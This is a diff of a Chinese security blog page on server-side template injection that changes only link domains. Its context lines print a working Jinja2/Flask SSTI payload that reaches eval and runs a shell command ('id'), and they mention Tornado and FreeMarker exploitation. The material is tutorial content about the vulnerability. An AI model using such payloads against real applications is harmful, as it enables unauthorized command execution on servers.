@@ -573,7 +573,7 @@
 <h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>直接用Vlunhub上的exp：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/flask/ssti">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h4><p>参见护网杯的一道题：<a target="_blank" rel="noopener" href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado</a></p>
+<h4 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h4><p>参见护网杯的一道题：<a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado</a></p>
 <h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><h4 id="freeMarker"><a href="#freeMarker" class="headerlink" title="freeMarker"></a>freeMarker</h4><p>这个模板主要用于 java ,粗略得知new会导致安全问题，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p>
 <p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM%E6%88%AA%E5%9B%BE20200216163834.png"></p>
 <p>payload：</p>
@@ -623,7 +623,7 @@
       <blockquote>
         
           
-            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>http://www.m00nback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></p>
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>http://www.moonback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></p>
           
         
       </blockquote>
@@ -678,7 +678,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/&title=SSTI模板注入漏洞 - 明月归的小站&summary=本篇博客主要介绍了服务端模板注入漏洞及其利用方式！"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/&title=SSTI模板注入漏洞 - 明月归的小站&summary=本篇博客主要介绍了服务端模板注入漏洞及其利用方式！"
           
           >
           
@@ -690,7 +690,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/&title=SSTI模板注入漏洞 - 明月归的小站&summary=本篇博客主要介绍了服务端模板注入漏洞及其利用方式！"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/&title=SSTI模板注入漏洞 - 明月归的小站&summary=本篇博客主要介绍了服务端模板注入漏洞及其利用方式！"
           
           >
           
@@ -702,7 +702,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/&title=SSTI模板注入漏洞 - 明月归的小站&summary=本篇博客主要介绍了服务端模板注入漏洞及其利用方式！"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/&title=SSTI模板注入漏洞 - 明月归的小站&summary=本篇博客主要介绍了服务端模板注入漏洞及其利用方式！"
           
           >
           
